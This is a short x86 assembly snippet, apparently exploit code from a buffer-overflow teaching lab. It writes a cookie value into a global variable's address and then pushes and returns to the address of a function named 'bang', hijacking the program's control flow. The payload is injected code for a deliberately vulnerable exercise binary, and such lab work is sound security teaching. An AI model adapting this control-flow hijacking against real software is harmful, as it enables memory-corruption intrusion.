#move cookie into address where it will be pulled from
  movl  $0x58c608ec, %ebx # put cookie into ebx
  movl  $0x0804a1dc, %ecx # put move address of global_variable to ecx
  movl  %ebx, (%ecx)	  # move cookie to memory address of the global_variable
  push  $0x080489a2	  # push the address of bang to the stack
  ret
